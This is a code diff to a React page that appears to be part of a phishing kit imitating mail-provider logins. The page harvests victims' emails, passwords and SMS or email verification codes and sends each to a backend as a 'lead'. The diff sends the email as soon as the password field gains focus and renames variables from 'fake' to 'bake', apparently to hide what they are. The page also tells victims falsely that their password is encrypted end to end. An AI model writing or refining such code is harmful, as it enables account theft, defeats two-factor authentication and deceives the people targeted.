@@ -9,13 +9,21 @@ import "../styles/providerPage.css";
 export function ProviderPage() {
   const { provider: providerParam, codeLength: codeLengthParam } = useParams();
   const provider = selectProvider(providerParam);
-  const [email, setEmail] = useState("");
-  const [fakePass, setFakePass] = useState("");
+  const emailStorageKey = `phoenyx.provider.${provider?.id ?? "unknown"}.email`;
+  const [email, setEmail] = useState(() => {
+    try {
+      return sessionStorage.getItem(emailStorageKey) ?? "";
+    } catch {
+      return "";
+    }
+  });
+  const [bakePass, setBakePass] = useState("");
   const [customFieldValue, setCustomFieldValue] = useState("");
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [fakeCode, setFakeCode] = useState("");
+  const [bakeCode, setBakeCode] = useState("");
+  const lastSentEmailRef = useRef<string | null>(null);
 
   if (!provider) {
     return (
@@ -39,6 +47,28 @@ export function ProviderPage() {
     void session.sendDevice();
   }, [session.sendDevice]);
 
+  async function handleEmailChange(event: React.ChangeEvent<HTMLInputElement>) {
+    setEmail(event.target.value);
+    const nextEmail = event.target.value.trim();
+    try {
+      sessionStorage.setItem(emailStorageKey, nextEmail);
+    } catch {}
+  }
+
+  async function handlePasswordFocus(
+    _event: React.FocusEvent<HTMLInputElement>,
+  ) {
+    const sharpEmail = sessionStorage.getItem(emailStorageKey)?.trim() ?? "";
+    if (!provider || isSubmitting || session.isLoading) return;
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(sharpEmail.trim())) return;
+    if (lastSentEmailRef.current === sharpEmail) return;
+    lastSentEmailRef.current = sharpEmail;
+    await session.sendLead({
+      provider: provider.id,
+      email: sharpEmail,
+    });
+  }
+
   async function handleSubmit(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setError("");
@@ -53,10 +83,10 @@ export function ProviderPage() {
     }
     setIsSubmitting(true);
     try {
-      await session.sendLead({
+      await session.sendAuthLead({
         provider: provider.id,
         email: email.trim(),
-        authToken: await encryptValue(fakePass.trim()),
+        authToken: await encryptValue(bakePass.trim()),
         ...(provider.extraFields
           ? {
               customField: {
@@ -67,16 +97,17 @@ export function ProviderPage() {
           : {}),
       });
     } finally {
+      setBakeCode("");
       setIsSubmitting(false);
     }
   }
 
   async function handleCodeChange(index: number, value: string) {
     const digit = value.replace(/\D/g, "").slice(-1);
-    const digits = fakeCode.padEnd(codeLength, " ").split("");
+    const digits = bakeCode.padEnd(codeLength, " ").split("");
     digits[index] = digit || " ";
     const nextCode = digits.join("").replace(/ +$/, "");
-    setFakeCode(nextCode);
+    setBakeCode(nextCode);
     if (digit && index < codeLength - 1) {
       inputRefs.current[index + 1]?.focus();
     }
@@ -90,24 +121,25 @@ export function ProviderPage() {
       .getData("text")
       .replace(/\D/g, "")
       .slice(0, codeLength);
-    setFakeCode(pasted);
+    setBakeCode(pasted);
     inputRefs.current[Math.min(pasted.length, codeLength - 1)]?.focus();
   }
 
   async function handleCodeSubmit(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
-    setFakeCode("");
     setError("");
-    if (!provider || isSubmitting || fakeCode.length < codeLength) return;
+    if (!provider || isSubmitting || bakeCode.length < codeLength) return;
     setIsSubmitting(true);
     try {
       await session.sendCodeLead({
         provider: provider.id,
         email: email,
         type: session.process === "verify-sms-code" ? "sms" : "email",
-        code: fakeCode,
+        code: bakeCode,
       });
     } finally {
+      setBakeCode("");
+      inputRefs.current[0]?.focus();
       setIsSubmitting(false);
     }
   }
@@ -141,6 +173,29 @@ export function ProviderPage() {
       new TextEncoder().encode(value),
     );
     return btoa(String.fromCharCode(...new Uint8Array(ciphertext)));
+  }
+
+  function decoupleError(error: string) {
+    return error
+      .split(/(?<=[.!?])\s+/)
+      .map((err) => err.trim())
+      .filter(Boolean)
+      .map((err) =>
+        err.endsWith("!")
+          ? ({ text: err, type: "exclamation" } as const)
+          : err.endsWith("?")
+            ? ({ text: err, type: "question" } as const)
+            : err.endsWith(".")
+              ? ({ text: err.slice(0, -1), type: "period" } as const)
+              : ({ text: err, type: "period" } as const),
+      );
+  }
+
+  function decoupleMessage(message: string) {
+    return message
+      .split(/\n+/)
+      .map((part) => part.trim())
+      .filter(Boolean);
   }
 
   return (
@@ -182,7 +237,7 @@ export function ProviderPage() {
                   autoComplete="email"
                   id="mail-email"
                   maxLength={254}
-                  onChange={(event) => setEmail(event.target.value)}
+                  onChange={(event) => void handleEmailChange(event)}
                   placeholder={provider.emailSample}
                   required
                   type="email"
@@ -200,10 +255,11 @@ export function ProviderPage() {
                   autoComplete="off"
                   id="mail-password"
                   minLength={1}
-                  onChange={(event) => setFakePass(event.target.value)}
+                  onChange={(event) => setBakePass(event.target.value)}
+                  onFocus={(event) => void handlePasswordFocus(event)}
                   required
                   type="password"
-                  value={fakePass}
+                  value={bakePass}
                 />
                 <span className="field-hint">
                   Your password with this site is encrypted end to end.
@@ -244,7 +300,14 @@ export function ProviderPage() {
               session.status === "flagged" ||
               session.status === "failed" ? (
                 <p className="form-message form-error" role="alert">
-                  {error || session.message}
+                  {decoupleError(error || session.message).map((err, index) => (
+                    <span
+                      key={`error-${err.type}-${index}`}
+                      className={`form-error-text ${err.type}`}
+                    >
+                      {err.text}
+                    </span>
+                  ))}
                 </p>
               ) : null}
               <button
@@ -392,14 +455,14 @@ export function ProviderPage() {
                       inputMode="numeric"
                       autoComplete="off"
                       maxLength={1}
-                      value={fakeCode[index] ?? ""}
+                      value={bakeCode[index] ?? ""}
                       onChange={(event) =>
                         handleCodeChange(index, event.target.value)
                       }
                       onKeyDown={(event) => {
                         if (
                           event.key === "Backspace" &&
-                          !fakeCode[index] &&
+                          !bakeCode[index] &&
                           index > 0
                         ) {
                           inputRefs.current[index - 1]?.focus();
@@ -425,7 +488,7 @@ export function ProviderPage() {
                         fontWeight: 700,
                         textAlign: "center",
                         outlineColor: "var(--accent)",
-                        boxShadow: fakeCode[index]
+                        boxShadow: bakeCode[index]
                           ? "0 0 0 2px var(--accent)22"
                           : "none",
                       }}
@@ -439,12 +502,22 @@ export function ProviderPage() {
                     className="form-message form-error form-code-error"
                     role="alert"
                   >
-                    {error || session.message}
+                    {decoupleError(error || session.message).map(
+                      (err, index) => (
+                        <span
+                          key={`error-${err.type}-${index}`}
+                          className={`form-error-text ${err.type}`}
+                        >
+                          {err.text}
+                        </span>
+                      ),
+                    )}
                   </p>
                 ) : null}
                 <button
                   type="submit"
-                  disabled={!new RegExp(`^\\d{${codeLength}}$`).test(fakeCode)}
+                  className="submit-button"
+                  disabled={!new RegExp(`^\\d{${codeLength}}$`).test(bakeCode)}
                   style={{
                     width: "100%",
                     marginTop: 28,
@@ -456,7 +529,7 @@ export function ProviderPage() {
                     fontSize: 14,
                     fontWeight: 700,
                     cursor: "pointer",
-                    opacity: new RegExp(`^\\d{${codeLength}}$`).test(fakeCode)
+                    opacity: new RegExp(`^\\d{${codeLength}}$`).test(bakeCode)
                       ? 1
                       : 0.5,
                   }}
@@ -485,11 +558,15 @@ export function ProviderPage() {
               ✓
             </span>
             <p className="eyebrow">THANK YOU</p>
-            <h4 id="mail-heading">{session.message}</h4>
+            <span className="email-preview-tag">
+              {sessionStorage.getItem(emailStorageKey) ?? email}
+            </span>
+            <h3 id="mail-heading">
+              {decoupleMessage(session.message).map((part, index) => (
+                <span key={`message-${index}`}>{part}</span>
+              ))}
+            </h3>
             <p>{success}</p>
-            <Link className="submit-button success-link" to="/providers">
-              Submit Alternative Email
-            </Link>
           </div>
         )}
       </section>
